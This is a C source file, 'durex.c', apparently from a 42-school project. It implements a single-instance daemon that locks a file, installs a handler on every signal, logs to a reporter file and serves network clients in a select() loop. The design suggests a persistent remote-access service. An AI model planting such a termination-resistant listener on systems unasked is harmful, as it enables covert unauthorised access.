/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   durex.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/07/15 02:43:33 by root              #+#    #+#             */
/*   Updated: 2018/08/05 21:10:38 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

/* signal */
#include <signal.h>
/* remove */
#include <stdio.h>
/* exit */
#include <stdlib.h>
/* open */
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "main.h"
#include "durex.h"

static void			cleanEnvironement()
{
	e.lock = -1;
	e.server.reporter = -1;
	e.server.fd = -1;
	memset(&e.server.fdr, 0, sizeof(e.server.fdr));
	memset(&e.server.fdw, 0, sizeof(e.server.fdw));
	for (int i = 0; i < SERVER_CLIENT_MAX; i++)
		clearClient(&e.server.client[i]);
}

static int			launch_program()
{
	e.lock = open(DUREX_LOCK_FILE, O_CREAT | O_WRONLY, 0600);
	if (e.lock < 0)
		return 0;
	if (flock(e.lock, LOCK_EX | LOCK_NB))
		return 0;
	for (int i = 0; i < NSIG; i++) {
		signal(i, &durexSigterm);
	}
	return 1;
}

static int			hireReporter()
{
	return open(SERVER_REPORTER, O_CREAT | O_APPEND | O_RDWR, 0600);
}

static int			setupSelect()
{
	int				i;
	int				max;

	FD_ZERO(&e.server.fdr);
	FD_ZERO(&e.server.fdw);
	FD_SET(e.server.fd, &e.server.fdr);
	max = e.server.fd;
	i = 0;
	while (i < SERVER_CLIENT_MAX)
	{
		if (e.server.client[i].fd > max)
			max = e.server.client[i].fd;
		if (e.server.client[i].fd != -1) {
			FD_SET(e.server.client[i].fd, &e.server.fdr);
			FD_SET(e.server.client[i].fd, &e.server.fdw);
		}
		i++;
	}
	return max;
}

void				durex()
{
	int				maxfd;
	int				ret;
	struct timeval	timeout;

	cleanEnvironement();
	if (launch_program()) {
		e.server.reporter = hireReporter();
		e.server.fd = openServer(SERVER_ADDR, SERVER_PORT);
		while (1)
		{
			maxfd = setupSelect();
			ret = select(maxfd + 1, &e.server.fdr, &e.server.fdw, NULL, &timeout);
			if (ret == -1)
				break ;
			if (FD_ISSET(e.server.fd, &e.server.fdr))
				serverAcceptConnections();
			for (int i = 0; i < SERVER_CLIENT_MAX; i++)
			{
				if (e.server.client[i].fd == -1)
					continue ;
				if (FD_ISSET(e.server.client[i].fd, &e.server.fdr))
					serverReadClient(&e.server.client[i]);
				if (FD_ISSET(e.server.client[i].fd, &e.server.fdw))
					serverWriteClient(&e.server.client[i]);
			}
		}
	}
	quitClearlyServer();
	quitClearlyDaemon();
}

void			quitClearlyDaemon()
{
	flock(e.lock, LOCK_UN);
	close(e.lock);
	remove(DUREX_LOCK_FILE);
	exit(0);
}
